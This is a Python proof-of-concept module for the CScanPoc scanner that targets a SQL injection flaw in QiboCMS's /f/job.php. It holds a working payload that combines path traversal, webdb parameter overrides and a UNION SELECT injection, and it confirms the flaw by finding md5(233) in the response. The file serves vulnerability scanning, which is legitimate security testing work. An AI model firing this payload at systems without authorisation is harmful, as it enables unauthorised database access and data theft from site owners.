# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0008' # 平台漏洞编号，留空
    name = 'QiboCMS SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2013-03-03'  # 漏洞公布时间
    desc = '''
        QiboCMS /f/job.php?job=getzone&typeid=zone&fup= SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4e66c9ee-b6f1-4e43-8f03-bb8ad686cf08'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/f/job.php?job=getzone&typeid=zone&fup=..\..\do\js&id=514125&webdb[web_open]=1&webdb[cache_time_js]=-1&pre=qb_label%20where%20lid=-1%20UNION%20SELECT%201,2,3,4,5,6,0,md5(233),9,10,11,12,13,14,15,16,17,18,19%23"
            url = arg + payload
            code, head, res, errcode,finalurl =  hh.http(url)

            if code == 200:
                if 'e165421110ba03099a1c0393373c5b43' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()